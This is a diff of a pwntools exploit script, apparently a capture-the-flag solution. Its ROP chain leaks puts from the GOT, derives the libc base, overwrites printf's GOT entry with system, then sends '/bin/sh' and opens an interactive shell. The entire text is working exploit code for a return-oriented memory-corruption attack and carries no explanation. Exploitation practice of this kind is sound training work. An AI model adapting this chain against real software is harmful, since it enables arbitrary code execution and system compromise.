@@ -38,7 +38,7 @@ def start(argv=[], *a, **kw):
         return start_remote(argv, *a, **kw)
 
 gdbscript = '''
-b *0x40132b
+b *0x401323
 continue
 '''.format(**locals())
 
@@ -49,35 +49,37 @@ io = start()
 rdi = 0x40132c
 gets = 0x401104
 execute = 0x1337000
-dati =  0x601060
+dati =  0x404040
 puts = 0x4010b4
 gotPuts = 0x404000
 gotGets = 0x404028
 gotPrintf = 0x404018
+printf = 0x4010e4
 main = 0x4007c7
-bss = 0x404050
-
-shell = asm(shellcraft.sh())
+bss = exe.bss(0x50)
 
 padding = b"A" * 56
 
-payload = flat(padding , p64(rdi) , gotPuts , p64(puts), 
-               p64(rdi), bss, p64(gets), bss)
+payload = flat(padding , p64(rdi) , gotPuts , p64(puts),
+               p64(rdi), gotPrintf, p64(gets),
+               p64(rdi), dati, p64(gets),
+               p64(rdi), dati, p64(printf))
+
 # print(len(shell))
 io.sendlineafter(b"> ", payload)
 print(io.recvline())
 leakPuts = unpack(io.recvline().strip())
-# leakPrintf = unpack(io.recvline().strip())
-# leakGets = unpack(io.recvline().strip())
+# print(type(leakPuts))
+log.info(f"{leakPuts = :x}")
 
-binsh =  0x1cb42f
-system = 0x58750
+libc = ELF('../libc.so.6')
+libc.address = leakPuts - libc.sym["puts"]
 
-addrBinSh = leakPuts - gotPuts + binsh
-addrSystem = leakPuts - gotPuts + system
-payload = flat(p64(rdi), p64(addrBinSh), p64(addrSystem))
+# addrBinSh = leakPuts -  + binsh
+addrSystem = libc.sym["system"]
+payload = p64(addrSystem)
 io.sendline(payload)
-
+io.sendline(b"/bin/sh\x00")
 
 io.interactive()
 
